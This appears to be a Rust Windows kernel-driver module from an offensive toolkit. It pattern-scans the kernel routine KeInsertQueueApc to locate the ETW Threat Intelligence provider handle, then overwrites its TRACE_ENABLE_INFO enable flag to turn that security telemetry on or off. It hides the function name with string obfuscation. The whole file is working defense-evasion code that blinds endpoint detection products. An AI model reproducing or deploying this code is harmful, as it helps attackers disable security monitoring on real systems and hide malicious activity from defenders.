use {
    obfstr::obfstr, 
    shared::structs::ETWTI,
    crate::utils::{patterns::scan_for_pattern, uni}, 
    wdk_sys::{
        ntddk::MmGetSystemRoutineAddress, 
        NTSTATUS, STATUS_UNSUCCESSFUL
    }
};

/// Represents ETW in the operating system.
pub struct Etw;

impl Etw {
    /// Enables or disables ETW tracing by manipulating the `ETWTI` structure.
    ///
    /// # Parameters
    /// - `info`: A pointer to an `ETWTI` structure, which contains information on whether to enable or disable ETW tracing.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn etwti_enable_disable(info: *mut ETWTI) -> Result<(), NTSTATUS> {
        let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
        let function_address = MmGetSystemRoutineAddress(&mut function_name);
        let pattern = [
            0x33, 0xD2,        // 33d2           xor  edx,edx
            0x48, 0x8B, 0x0D  // 488b0dcd849300  mov  rcx,qword ptr [nt!EtwThreatIntProvRegHandle (fffff807`41c19918)]
        ];

        let etwi_handle = scan_for_pattern(function_address, &pattern, 5, 9, 0x1000, u32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;
        let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
        (*trace_info).is_enabled = if (*info).enable {
            0x01
        } else {
            0x00
        }; 

        Ok(())
    }
}

#[repr(C)] 
pub struct TRACE_ENABLE_INFO {
    is_enabled: u32, 
    level: u8, 
    reserved1: u8,
    loggerid: u16,
    enable_property: u32, 
    reserved2: u32, 
    match_any_keyword: u64,
    match_all_keyword: u64
}